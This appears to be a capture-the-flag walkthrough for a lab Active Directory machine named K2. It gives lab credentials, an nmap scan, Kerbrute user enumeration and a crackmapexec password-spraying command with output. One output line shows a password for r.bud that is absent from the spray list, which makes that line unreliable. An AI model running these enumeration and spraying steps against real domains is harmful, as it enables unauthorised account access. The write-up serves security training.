# K2

## Machine Info

FQDN: K2Server.k2.thm

Domain: k2.thm

Domain SID: S-1-5-21-1966530601-3185510712-10604624



Data from Base Camp phase

```
james:Pwd@9tLNrC3!       James Bold 
root:RdzQ7MSKt)fNaz3!
rose:VrMAogdfxW!9        Rose Bud

bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```



## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.145.48 -oN port_scan.txt

Nmap scan report for 10.10.145.48
Host is up (0.038s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-30 13:55:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-30T13:57:24+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2025-07-29T13:51:27
|_Not valid after:  2026-01-28T13:51:27
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-30T13:56:44+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## AD user enum

All services has the anonymous/guest logon enable. We can think to use the data found in the previous challenge.

In AD env sometimes the username of the account is the first letter of name, dot, complete surname. Try to do this with 2 user found in the Linux Server.&#x20;

```
j.bold : Pwd@9tLNrC3!
r.bud : VrMAogdfxW!9
```

### AD user verify

To verify if the users exist in the domain we can use this command with Kerbrute tool:

```bash
./kerbrute_linux_amd64 userenum userlist.txt  --domain k2.thm --dc 10.10.145.48
```

<figure><img src="../../../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

Both users are valid.

Now we can try to do a Password Spray attack with credentials found in the previous challenge.

{% code title="passwd.list" %}
```
Pwd@9tLNrC3!
VrMAogdfxW!9
RdzQ7MSKt)fNaz3!
PasSW0Rd321
St3veRoxx32
PartyAlLDaY!32
L0v3MyDog!3!
PikAchu!IshoesU!
```
{% endcode %}

```bash
crackmapexec smb 10.10.145.48 -u userlist.txt -p passwd.list

SMB         10.10.145.48    445    K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8 
```

Try to this with Kerbrute or other tools.
